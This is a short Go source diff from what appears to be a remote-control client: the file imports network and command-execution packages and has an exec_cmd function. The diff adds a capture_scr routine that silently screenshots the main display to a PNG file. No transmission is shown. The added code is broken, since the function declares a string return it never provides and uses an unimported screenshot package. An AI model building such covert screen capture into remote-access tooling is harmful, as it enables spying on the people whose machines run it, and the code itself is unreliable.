@@ -5,7 +5,9 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"image/png"
 	"net"
+	"os"
 	"os/exec"
 	"strings"
 	"time"
@@ -57,5 +59,9 @@ func exec_cmd(cmd string) string {
 }
 
 func capture_scr() string {
-
+	bounds := screenshot.GetDisplayBounds(0)
+	img, _ := screenshot.CaptureRect(bounds)
+	file, _ := os.Create("scrshot.png")
+	defer file.Close()
+	png.Encode(file, img)
 }
